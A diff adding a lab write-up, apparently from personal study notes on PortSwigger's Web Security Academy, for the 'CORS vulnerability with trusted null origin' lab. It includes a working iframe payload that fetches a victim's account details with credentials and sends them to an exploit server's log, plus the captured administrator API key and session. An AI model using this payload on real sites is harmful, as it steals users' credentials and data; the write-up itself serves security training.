@@ -41,3 +41,76 @@ References:
 + https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Site
 + https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin
 + https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch
+
+### CORS vulnerability with trusted null origin
+<b>Null origin</b> is similar to wildcard origin, a null origin is another way to allow any request to access the resources on websites, <b>but unlike wildcard origin, null origin allows access to the response if the Access-Control-Allow-Credentials header is set to true.</b>
+
+#### Lab
+The lab has an insecure CORS configuration in that it trusts the "null" origin.
+
+To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+Let's login to see what requests are sent to the server. We can see that the details of the account is returned through a JSON response
+<br>![img](./img/177.png)<br>
+Since the <b>Access-Control-Allow-Credentials</b> header is returned we can infer that a CORS policy is in place. Let's try to see if setting a Origin to null in the request we can access the response (in this case we will see the Access-Control-Allow-Credential set to true again).
+<br>![img](./img/178.png)<br>
+<i>Please note that from now on my lab id changed.</i>
+This is the case, so we know that the application implements insecure CORS configuration, now we could craft a CSRF payload to stole the victim API key, the proble here is how to force the victim's browser to send a null Origin value. <i>Googling</i> a bit it comes out that we can use an iframe with the <b>sandobox attribute</b>, but we have to set the value to allow scripts of course. We will use the <b>scrdoc</b> attribute to provide inline Javascript code to embed, overriding the src attribute.
+Then we can try to use the following payload in the body of the exploit server:
+
+    <iframe style="visibility:hidden" sandbox="allow-scripts" srcdoc="<script> fetch('https://0ad2004604eea142c0fe36cb00830033.web-security-academy.net/accountDetails', {credentials: 'include'}).then(response => response.text()).then((response) => document.location='/log?k='+encodeURIComponent(response));</script>"></iframe>
+
+Save it into the body of the exploit server (1), then save it (2) and deliver it to the victim (3). After a minute visit the log (4) and you should see an entry related to the administrator data (5).
+<br>![img](./img/179.png)<br>
+<i>Please note that tryng to view the xploit will result in the request block due to CORS missing allow origin. Following there is a communication's extract in the HAR format </i>  
+
+    "request": {
+
+          "bodySize": 0,
+
+          "method": "GET",
+
+          "url": "https://0a9400f0049d2321c133bcfa000500a3.web-security-academy.net/accountDetails",
+
+          "httpVersion": "HTTP/2",
+          ...
+           {
+
+              "name": "Origin",
+
+              "value": "null"
+
+            },
+
+    ---------------------------------------------------------------------------------------------------
+    "response": {
+
+          "status": 401,
+
+          "statusText": "Unauthorized",
+
+          "httpVersion": "HTTP/2",
+          ...
+
+Actually in the response the Access-Control-Allow-Credentials header is missing, that's not clear to me. I opened a post on the forum, if you are interested you can follow [here](https://forum.portswigger.net/thread/lab-cors-vulnerability-with-trusted-null-origin-cors-missing-allow-origin-4e02491c?CategoryId=how-do-i).
+
+Coming back to the retrived data we can proceed to decode the query string and we get
+
+    k={
+        "username": "administrator",
+        "email": "",
+        "apikey": "zt2GNo4oPlKuJGF9nAm290g2vk1lUxrW",
+        "sessions": [
+            "LllLyyMkEjhiNx95JDsMmX5fhZOGfxSZ"
+        ]
+    }
+
+Then we can submit the apikey to solve the lab
+
+
+#### References
+- https://portswigger.net/web-security/cors/access-control-allow-origin
+- https://portswigger.net/web-security/cors
+- https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox
